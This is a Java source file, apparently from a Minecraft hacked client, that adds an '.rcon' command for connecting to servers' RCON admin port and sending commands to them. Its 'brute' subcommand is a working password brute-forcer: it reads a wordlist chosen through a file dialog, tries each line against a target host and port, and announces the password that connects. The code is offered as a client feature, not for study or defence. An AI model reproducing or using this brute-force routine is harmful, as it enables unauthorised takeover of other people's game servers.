package koks.manager.command.impl;

import god.buddy.aot.BCompiler;
import koks.manager.command.Command;
import koks.manager.command.CommandInfo;
import net.kronos.rkon.core.Rcon;

import javax.swing.*;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.util.List;

/**
 * @author kroko
 * @created on 06.10.2020 : 14:21
 */

@CommandInfo(name = "rcon")
public class RconLogin extends Command {

    public Rcon rcon = null;
    private List<String> lines;

    @BCompiler(aot = BCompiler.AOT.NORMAL)
    @Override
    public void execute(String[] args) {
        if (args.length == 0) {
            sendmsg(".rcon brute [Host] [Port]", true);
            sendmsg(".rcon connect [Host] [Port] [Password]", true);
            sendmsg(".rcon send [Command]", true);
            sendmsg(".rcon disconnect", true);
        } else if (args.length == 1) {
            if (args[0].equalsIgnoreCase("disconnect")) {
                if (rcon != null) {
                    try {
                        rcon.disconnect();
                        rcon = null;
                        sendmsg("disconnection successfull!", true);
                    } catch (IOException e) {
                        sendmsg("You are not in a Rcon!", true);
                        e.printStackTrace();
                    }
                } else {
                    sendError("Connection", "you are not connected with an rcon");
                }
            }
        } else {
            if (args[0].equalsIgnoreCase("connect")) {
                try {
                    rcon = new Rcon(args[1], Integer.parseInt(args[2]), args[3].getBytes());
                    sendmsg("connection successfull!", true);
                    sendmsg("You can send Commands with: " + ".rcon send <command>", true);
                } catch (Exception ignored) {
                }
            } else if (args[0].equalsIgnoreCase("send")) {
                if (rcon != null) {
                    String cmd = "";
                    for (int i = 1; i < args.length; i++) {
                        cmd += args[i] + " ";
                    }
                    try {
                        rcon.command(cmd);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } else {
                    sendError("Connection", "you are not connected with an rcon");
                }
            } else if (args[0].equalsIgnoreCase("brute")) {
                String host = args[1];
                int port = Integer.parseInt(args[2]);
                JFileChooser chooser = new JFileChooser();
                int rVal = chooser.showOpenDialog(null);

                if (chooser.getSelectedFile() != null && rVal == JFileChooser.APPROVE_OPTION) {
                    try {

                        RandomAccessFile rand = new RandomAccessFile(chooser.getSelectedFile(), "rw");

                        String zeile = null;
                        while ((zeile = rand.readLine()) != null && rcon == null) {
                            String line = zeile;
                            try {
                                rcon = new Rcon(host, port, line.getBytes());
                                sendmsg("The Password is: " + line, true);
                                rand.close();
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }
}
